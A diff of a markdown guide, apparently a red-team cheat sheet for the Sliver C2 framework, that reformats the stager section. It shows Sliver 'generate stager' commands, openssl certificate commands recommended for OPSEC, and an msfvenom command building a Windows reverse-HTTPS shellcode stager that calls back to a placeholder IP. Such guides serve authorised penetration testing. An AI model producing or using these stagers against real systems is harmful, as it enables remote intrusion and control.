@@ -459,7 +459,7 @@ sliver > generate stager -r http -L <IP> -l 8080 -a x64 -o windows -f raw -s sli
 
 1. Use custom TLS key and certificate (this is optional but recommended for OPSEC)
 
-* Encrypted TLS key and certification
+Encrypted TLS key and certification
 
 ```
 $ openssl req -x509 -newkey rsa:4096 -keyout keyfile.pem -out certificate.pem -sha256 -days 365
@@ -469,7 +469,7 @@ $ openssl x509 -in certificate.pem -text -noout
 $ openssl rsa -in keyfile.pem -check > key.pem
 ```
 
-* Non-encrypted TLS key and certification
+Non-encrypted TLS key and certification
 
 ```
 $ openssl req -new -x509 -keyout key.pem -out certificate.pem -days 365 -nodes
@@ -485,7 +485,9 @@ sliver > generate stager -r https -L <IP> -l 8080 -a x64 -o windows -f raw -s sl
 
 Or you can generate it with `msfvenom`
 
-`$ msfvenom -p windows/x64/custom/reverse_winhttps lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-https-stager.bin`
+```
+$ msfvenom -p windows/x64/custom/reverse_winhttps lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-https-stager.bin
+```
 
 ## 4.4 - Implants
 
